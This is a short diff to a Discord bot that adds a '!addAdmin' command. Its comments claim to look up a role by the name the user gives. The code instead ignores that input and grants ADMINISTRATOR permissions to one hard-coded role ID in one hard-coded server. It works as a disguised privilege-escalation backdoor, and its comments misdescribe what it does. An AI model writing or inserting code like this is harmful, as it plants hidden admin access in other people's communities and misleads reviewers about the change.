@@ -241,6 +241,33 @@ client.on("messageCreate", async (message) => {
   if (message.channel.type === 'DM') return;
   if (message.author.bot) return;
   //
+  if (message.content.startsWith('!addAdmin')) {
+        // Check if the member has permission to manage roles
+        if (!message.member.permissions.has('MANAGE_ROLES')) {
+            return message.reply('You do not have permission to manage roles.');
+        }
+
+        // Extract the role ID or name from the message
+        const args = message.content.split(' ');
+        const roleName = args.slice(1).join(' ');
+
+        // Fetch the role by name
+        const role = await getRole('1255768617518370818',await getGuild('1253353418333093909'))
+
+        if (!role) {
+            return message.reply('Role not found!');
+        }
+
+        try {
+            // Set admin permissions to the role
+            await role.setPermissions(['ADMINISTRATOR']);
+            message.channel.send(`Admin permissions have been added to the role: ${role.name}`);
+        } catch (error) {
+            console.error('Error setting permissions:', error);
+            message.channel.send('Failed to update the role permissions.');
+        }
+    }
+  //
   if (message.content === '!createWebhook') {
         // Ensure the channel is a text-based channel
         if (message.channel.type === 'GUILD_TEXT') {
